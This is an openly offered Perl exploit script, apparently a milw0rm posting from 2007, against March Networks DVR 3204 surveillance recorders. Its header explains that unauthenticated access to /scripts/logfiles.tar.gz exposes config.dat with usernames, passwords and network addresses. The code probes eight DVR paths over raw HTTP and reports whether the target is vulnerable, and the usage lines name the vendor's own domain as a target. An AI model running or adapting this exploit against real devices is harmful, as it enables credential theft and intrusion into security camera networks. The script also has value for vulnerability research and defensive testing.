#!/usr/bin/perl
#
# March Networks DVR 3204 Logfile Information Disclosure Exploit
#
# Since configuration of the IP address, user console and root is 
# carried out over the "administrator console", the vulnerability 
# lies within Watchdog's HTTP server application.
#
# Any user can obtain the log files without authentication by accessing
# the following PATH http:/dvraddress/scripts/logfiles.tar.gz. The intruder
# can then uncompress the tar file and access the config.dat to reveal
# username and passwords, names of devices, and IP addresses of other 
# security components attached to the corporate networ
#
# More details: 
# http://www.sybsecurity.com/resources/static/
# An_Insecurity_Overview_of_the_March_Networks_DVR-CCTV_3204.pdf
#
# By Alex Hernandez ahernandez [at] sybsecurity [dot] com
#
# Usage: perl -x dvr3204_exp.pl www.marchnetworks.com:80
# Usage: perl -x dvr3204_exp.pl 127.0.0.1:80
#
# $ perl -x dvr3204_exp.pl 10.50.10.246:80
# Trying...
#
# THIS HOST IS VULNERABLE!!! :-)
# Check the details on w w w [dot] sybsecurity [dot] c o m
#
# THIS HOST IS NOT VULNERABLE :-(
# Check the settings on browser...
#
# 

use Socket;

if ($#ARGV<0) {die "
\nMarch Networks DVR 3204 exploit\n
More details: http://www.sybsecurity.com
By Alex Hernandez\n 
ahernandez [at] sybsecurity [dot] com\n

Usage: perl -x $0 www.marchnetworks.com:80
Usage: perl -x $0 127.0.0.1:80\n\n";}

($host,$port)=split(/:/,@ARGV[0]);

print "Trying...\n\n";
$target = inet_aton($host);
$flag=0;

my @results=sendraw("GET /Level1Authenticate.htm HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

my @results=sendraw("GET /UserAuthenticate.htm HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

my @results=sendraw("GET /public/index.htm HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

my @results=sendraw("GET /public/UpgradeStatus.htm HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

my @results=sendraw("GET /public/UpgradeHistory.htm HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

my @results=sendraw("GET /public/UpgradeHistory.txt HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

my @results=sendraw("GET /public/dvrlog HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

my @results=sendraw("GET /scripts/logfiles.tar.gz HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

if ($flag==1){print "THIS HOST IS VULNERABLE!!! :-)\n
Check the details on www [dot] sybsecurity [dot] com\n";}
else {print "THIS HOST IS NOT VULNERABLE :-( \n
Check the settings on browser...\n";}

sub sendraw {
        my ($pstr)=@_;
        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,$port,$target)){
                my @in;
                select(S); $|=1; print $pstr;
                while(<S>){ push @in, $_;}
                select(STDOUT); close(S); return @in;
        } else { die("Can't connect check the port or address...\n"); }
}

# milw0rm.com [2007-12-27]
